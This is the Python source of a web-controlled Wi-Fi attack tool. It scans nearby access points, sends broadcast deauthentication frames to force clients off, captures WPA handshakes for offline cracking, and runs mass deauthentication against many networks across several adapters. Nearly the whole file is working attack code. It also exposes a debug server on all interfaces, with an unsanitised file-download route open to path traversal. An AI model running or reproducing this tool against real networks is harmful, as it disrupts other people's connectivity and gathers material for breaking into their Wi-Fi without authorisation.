import subprocess, os, time, signal
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from flask import Flask, render_template, send_file
from flask_socketio import SocketIO


## Variables ##
scanCSVFile = "dumps/aplist-01.csv"
captureFile = "dumps/dump-01.cap"
captureCSV = "dumps/dump-01.csv"
currentCaptureFile = ""

interfaces = []
WiFi4Interfaces = []
WiFi5Interfaces = []
AccessPoints = []
exceptionList = ["2C:CF:67:C4:54:41", "2C:CF:67:99:F7:BB"]

scanning = False
attacking = False
deauthenticating = False

scanner = None
eapol = None
deauth = None

hidden = False
bssid = True
channel = True
power = True
security = True
## Variables ##


## Flask ##
app = Flask(__name__)
socket = SocketIO(app)

@app.route("/")
def landingPage():
    return render_template("index.html")

@app.route("/handshake")
def handshakeAttack():
    return render_template("handshake.html")

@app.route("/deauth")
def deauthAttack():
    return render_template("deauth.html")

@app.route("/captureFile")
def serveCapture():
    return send_file(currentCaptureFile, as_attachment=True)

@app.route("/captureFile/<fileName>")
def sendFile(fileName):
    return send_file(f"dumps/{fileName}", as_attachment=True)
## Flask ##


## CSV Cleaner ##
def CSVCleaner():
    try:
        os.remove(scanCSVFile)
    except FileNotFoundError:
        pass
    else:
        print("Clearing previous scan CSV file")

    try:
        os.remove(captureFile)
        
    except FileNotFoundError:
        pass
    else:
        print("Clearing previous capture .cap file")

    try:
        os.remove(captureCSV)
    except FileNotFoundError:
        pass
    else:
        print("Clearing previous capture CSV file")
## CSV Cleaner ##


## AP Class ##
class APWrapper:
    def __init__(self, index, essid, clients, bssid, channel, signal, security):
        self.index = index
        self.essid = essid
        self.clients = clients
        self.bssid = bssid
        self.channel = channel
        self.signal = signal
        self.security = security

    @property
    def signalStrength(self):
        SS = int(self.signal)
        if SS <= 0 and SS >= -3:
            return "Excellent"
        elif SS >= -65:
            return "Good"
        elif SS >= -75:
            return "Average"
        elif SS >= -85:
            return "Poor"
        elif SS < -85:
            return "Unusable"

    def parseTable(self, bssid, channel, power, security):
        data = f"<tr index='{self.index}' class='APs'><td><b>{self.index}<b></td><td>{self.essid}</td><td>{self.clients}</td>"
        
        if bssid:
            data += f"<td>{self.bssid}</td>"
        if channel:
            data += f"<td>{self.channel}</td>"
        if power:
            data += f"<td>{self.signal} ({self.signalStrength})</td>"
        if security:
            data += f"<td>{self.security}</td>"

        data += "</tr>"
        return data
## AP Class ##


## Check Monitor Mode Support ##
def checkMonitorSupport(phy):
    output = subprocess.check_output(["sudo", "iw", "phy", phy, "info"], text=True)

    for inter in output.split('\n'):
        if "monitor" in inter:
            return 1
    
    return 0
## Check Monitor Mode Support ##


## Set Monitor Mode ##
def setMonitor(interface):
    killCommand = ["sudo", "airmon-ng", "check", "kill"]
    downCommand = ["sudo", "ip", "link", "set", interface, "down"]
    monitorCommand = ["sudo", "iw", interface, "set", "monitor", "none"]
    upCommand = ["sudo", "ip", "link", "set", interface, "up"]

    result = subprocess.run(killCommand, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
    if result.returncode != 0:
        print(result.stderr.strip())
        return 1
    
    result = subprocess.run(downCommand, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
    if result.returncode != 0:
        print(result.stderr.strip())
        return 1

    result = subprocess.run(monitorCommand, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
    if result.returncode != 0:
        print(result.stderr.strip())
        return 1

    result = subprocess.run(upCommand, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
    if result.returncode != 0:
        print(result.stderr.strip())
        return 1

    return 0
## Set Monitor Mode ##


## Set Channel ##
def setChannel(interface, channel):
    iwset = ["sudo", "iw", "dev", interface, "set", "channel", str(channel)]

    subprocess.run(iwset, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
## Set Channel ##


## Read CSV Function ##
def parseCSV(file):
    with open(file) as f:
        global AccessPoints
        data = f.readlines()
        objectIndex = 1
        parsingStations = False
        AccessPoints = []
        AssociatedBSSIDs = []

        for row in data:
            row = row.split(',')

            if not (row == ['\n'] or "BSSID" in row):
                if "Station MAC" in row:
                    parsingStations = True
                    continue

                if not parsingStations:
                    if row[0].strip() in exceptionList:
                        continue

                    if not hidden and row[13].strip() != "":
                        AccessPoints.append(APWrapper(objectIndex, row[13].strip(), 0, row[0].strip(), row[3].strip(), row[8].strip(), row[5].strip() + " " + row[6].strip() + " " + row[7].strip()))
                        objectIndex += 1
                    elif hidden:
                        if row[13].strip() == "":
                            AccessPoints.append(APWrapper(objectIndex, "Hidden SSID", 0, row[0].strip(), row[3].strip(), row[8].strip(), row[5].strip() + " " + row[6].strip() + " " + row[7].strip()))
                            objectIndex += 1
                        else:
                            AccessPoints.append(APWrapper(objectIndex, row[13].strip(), 0, row[0].strip(), row[3].strip(), row[8].strip(), row[5].strip() + " " + row[6].strip() + " " + row[7].strip()))
                            objectIndex += 1

                AssociatedBSSIDs.append(row[5].strip())

        for ap in AccessPoints:
            ap.clients = AssociatedBSSIDs.count(ap.bssid)
## Read CSV Function ##


## Run Airodump ##
def runAirodump(interface):
    global scanner
    CSVCleaner()

    if setMonitor(interface):
        socket.emit("table", "Some error occurred while setting up the interface")
        return

    print("Running Airodump on interface:", interface)

    airodump = ["sudo", "airodump-ng", "--band", "abg", "--output-format", "csv", "--write-interval", "1", "-a", "-w", "dumps/aplist", interface]
    scanner = subprocess.Popen(airodump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

    time.sleep(2)
    print("Scanning Started")

    while scanning:
        parseCSV(scanCSVFile)
        table = "<thead id='tablehead'><tr><th>Index</th><th>ESSID</th><th>Clients</th>"
        if bssid:
            table += "<th>BSSID</th>"
        if channel:
            table += "<th>Channel</th>"
        if power:
            table += "<th>Signal Strength</th>"
        if security:
            table += "<th>Security</th>"

        table += "</tr></thead><tbody>"
        for row in AccessPoints:
            table += row.parseTable(bssid, channel, power, security)
        table += "</tbody><tfoot id='tablefoot'></tfoot>"

        socket.emit("table", table)
        time.sleep(2)

    try:
        os.killpg(os.getpgid(scanner.pid), signal.SIGKILL)
    except ProcessLookupError:
        pass
    else:
        print("Scanning Stopped")
    scanner.wait()
## Run Airodump ##


## Start Attack ##
def EAPOLAttack(interface, channel, bssid, essid):
    global attacking, currentCaptureFile, eapol, deauth
    CSVCleaner()

    if setMonitor(interface):
        socket.emit("table", "Some error occurred while setting up the interface")
        return
    
    print("Started Listening for EAPOL Packets for BSSID:", bssid)
    
    airodump = ["sudo", "airodump-ng", "--channel", str(channel), "--bssid", bssid, "--write-interval", "1", "--output-format", "pcap,csv", "-w", "dumps/dump", interface]

    eapol = subprocess.Popen(airodump, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, start_new_session=True)
    time.sleep(3)

    while attacking:
        parseCSV("dumps/dump-01.csv")
        for ap in AccessPoints:
            socket.emit("attackInfo", [ap.essid, ap.bssid, ap.channel, ap.signal + f" ({ap.signalStrength})", ap.security, ap.clients])


        dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)

        packet = RadioTap() / dot11 / Dot11Deauth(reason=1)

        sendp(packet, iface=interface, count=20, inter=0.001, verbose=True)

        i = eapol.stdout.readline()

        if "EAPOL" in i.strip() or "WPA handshake" in i.strip():
            attacking = False
            time.sleep(3)
            t = time.gmtime(time.time())

            saveFile = f"dumps/{bssid}-{t[0]}-{t[1]}-{t[2]}-{t[5]}.cap" if essid == "SSID Hidden" else f"dumps/{essid}-{t[0]}-{t[1]}-{t[2]}-{t[5]}.cap"
            os.rename("dumps/dump-01.cap", saveFile)
            currentCaptureFile = saveFile

            socket.emit("eapolFound")
            print("EAPOL Captured")

        time.sleep(0.75)

    try:
        os.killpg(os.getpgid(eapol.pid), signal.SIGKILL)
    except ProcessLookupError:
        pass
    else:
        print("Terminating EAPOL Scan")

    eapol.wait()

    CSVCleaner()
## Start Attack ##


## Load Balance AP on WiFi Adapters ##
def attackScheduler(attackInterfaceList, attackList):
    schedules = {}
    WiFi4 = []
    WiFi5 = []
    AP2_4Ghz = []
    AP5Ghz = []

    attackList.sort(key=lambda ap: ap.channel)

    def sortInterfaces():
        for interface in attackInterfaceList:
            if interface.endswith("(WiFi 4)"):
                WiFi4.append(interface[:len(interface) - 9])
            elif interface.endswith("(WiFi 5)"):
                WiFi5.append(interface[:len(interface) - 9])

    def sortAPs():
        for ap in attackList:
            if int(ap.channel) >= 36:
                AP5Ghz.append(ap)
            else:
                AP2_4Ghz.append(ap)
    
    def initializeDictionary():
        for i in WiFi4:
            schedules[i] = []

        for i in WiFi5:
            schedules[i] = []

    
    def distribute5GhzAPs():
        interfaceIndex = 0
        for ap in AP5Ghz:
            schedules[WiFi5[interfaceIndex]].append(ap)
            interfaceIndex += 1

            if interfaceIndex == len(WiFi5):
                interfaceIndex = 0

        if not WiFi4:
            for ap in AP2_4Ghz:
                schedules[WiFi5[interfaceIndex]].append(ap)
                interfaceIndex += 1

                if interfaceIndex == len(WiFi5):
                    interfaceIndex = 0

    def calculateMaxSchedules():
        global maxClients
        maxClients = 0
        for i in WiFi5:
            if len(schedules[i]) > maxClients:
                maxClients = len(schedules[i])

    def distribute2_4GhzAPs():
        interfaceIndex = 0

        if not WiFi5:
            for ap in AP2_4Ghz:
                print(interfaceIndex)
                schedules[WiFi4[interfaceIndex]].append(ap)
                interfaceIndex += 1

                if interfaceIndex == len(WiFi4):
                    interfaceIndex = 0
        else:
            appendingEqually = False
            for ap in AP2_4Ghz:
                if appendingEqually or len(schedules[WiFi4[interfaceIndex]]) >= maxClients:
                    appendingEqually = True

                    schedules[(WiFi4 + WiFi5)[interfaceIndex]].append(ap)
                    interfaceIndex += 1

                    if interfaceIndex == len((WiFi4 + WiFi5)):
                        interfaceIndex = 0
                else:
                    schedules[WiFi4[interfaceIndex]].append(ap)
                    interfaceIndex += 1

                    if interfaceIndex == len(WiFi4):
                        interfaceIndex = 0
    
    sortInterfaces()
    sortAPs()
    initializeDictionary()
    if WiFi5:
        distribute5GhzAPs()
        calculateMaxSchedules()
    if WiFi4:
        distribute2_4GhzAPs()

    return schedules
## Load Balance AP on WiFi Adapters ##


## Send Deauth Packets to AP List ##
def deauthAttack(interface, victimList, packetCount):
    global deauthenticating
    setMonitor(interface)

    packetsSent = 0 
    while deauthenticating:
        for ap in victimList:
            setChannel(interface, ap.channel)
            
            dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap.bssid, addr3=ap.bssid)

            packet = RadioTap() / dot11 / Dot11Deauth(reason=1)

            sendp(packet, iface=interface, count=packetCount, inter=0.001, verbose=True)
            packetsSent += packetCount

            socket.emit("getDeauthStatus", [interface, ap.essid, ap.bssid, ap.channel, ap.signal + f" ({ap.signalStrength})", ap.security, len(victimList), packetsSent])

            #time.sleep(0.1)
## Send Deauth Packets to AP List ##


## Socket Events ##
@socket.on("getInterfaces")
def getInterfaces(_):
    global interfaces
    output = subprocess.check_output(["sudo", "iw", "dev"], text=True)
    interfaces = []

    for inter in output.split("\n"):
        if inter.strip().startswith("phy"):
            phy = inter.replace("#", "")
        if inter.strip().startswith("Interface"):
            if checkMonitorSupport(phy):
                interface = inter.strip()[10:]
                
                output = subprocess.check_output(["sudo", "iw", "phy", phy, "info"], text=True)
                for line in output.split("\n"):
                    if "MHz [36]" in line.strip():
                        version = 5
                        break

                    version = 4

                interfaces.append(interface + f" (WiFi {version})")

    if interfaces:
        return interfaces
    else:
        return ["No Wireless Interface Found"]

@socket.on("disconnect")
def stop():
    global scanning, attacking, deauthenticating
    
    if scanning:
        try:
            os.killpg(os.getpgid(scanner.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass
        else:
            print("Scanning Stopped")
        scanner.wait()

    if attacking:
        try:
            os.killpg(os.getpgid(eapol.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass
        else:
            print("Terminating EAPOL Scan")
        eapol.wait()

        try:
            os.killpg(os.getpgid(deauth.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass
        else:
            print("Terminating Deauthentication Attack")
        deauth.wait()

    scanning = False
    attacking = False
    deauthenticating = False

@socket.on("closePrevious")
def closePrevious():
    print("Closing Any Rogue Processes")
    stop()

@socket.on("showFiles")
def showFiles(_):
    files = os.scandir("dumps")
    fileCount = 0
    filesDict = {}
    filesDict["name"] = []
    filesDict["date"] = []
    filesDict["size"] = []
    
    for f in files:
        if f.name.endswith(".cap"):
            fileCount += 1
            filesDict["name"].append(f.name)

            t = time.gmtime(f.stat()[8])
            filesDict["date"].append(f"{t[1]}/{t[2]}/{t[0]}-{t[3]}{t[4]}{t[5]}")

            filesDict["size"].append(f"{(f.stat()[6] / 1024):.0f} KB")

    if fileCount == 0:
        filesDict["name"] = ["No Files Found"]
        filesDict["date"] = [""]
        filesDict["size"] = [""]

    return filesDict
    
@socket.on("startScan")
def startScan(interface):
    global scanning
    scanning = True
    socket.start_background_task(runAirodump, interface)

@socket.on("stopScan")
def stopScan():
    global scanning
    
    if scanning:
        try:
            os.killpg(os.getpgid(scanner.pid), signal.SIGKILL)
        except ProcessLookupError:
            pass
        else:
            print("Scanning Stopped")
        scanner.wait()

    scanning = False

@socket.on("columns")
def setColumns(checks):
    global hidden, bssid, channel, power, security

    hidden = checks[0]
    bssid = checks[1]
    channel = checks[2]
    power = checks[3]
    security = checks[4]

@socket.on("startEAPOLAttack")
def startEAPOLAttack(data):
    global scanning, attacking

    attacking = True
    index = data[0]
    interface = data[1]

    try:
        os.killpg(os.getpgid(scanner.pid), signal.SIGKILL)
    except ProcessLookupError:
        pass
    scanner.wait()
    scanning = False

    print(f"Attacking AP with index: {AccessPoints[index].bssid}")
    socket.start_background_task(EAPOLAttack, interface, AccessPoints[index].channel, AccessPoints[index].bssid, AccessPoints[index].essid)
    return AccessPoints[index].essid if AccessPoints[index].essid != "Hidden SSID" else AccessPoints[index].bssid

@socket.on("startDeauthAttack")
def startDeauthAttack(data):
    global deauthenticating
    deauthenticating = True

    attackInterfaces = []
    attackVictims = []
    packetCount = int(data[2])
    
    for i in data[0]:
        attackInterfaces.append(i)

    for index, value in enumerate(data[1]):
        if value:
            attackVictims.append(AccessPoints[index])

    schedule = attackScheduler(attackInterfaces, attackVictims)
    print(schedule)

    for i in attackInterfaces:
        socket.start_background_task(deauthAttack, i[:len(i) - 9], schedule[i[:len(i) - 9]], packetCount)

    print("Deauthentication Attack Started")

@socket.on("stopDeauthAttack")
def stopDeauthAttack():
    global deauthenticating

    deauthenticating = False
## Socket Events ##


## Host Interface ##
if __name__ == "__main__":

    socket.run(app, host="0.0.0.0", port=80, debug=True, allow_unsafe_werkzeug=True)
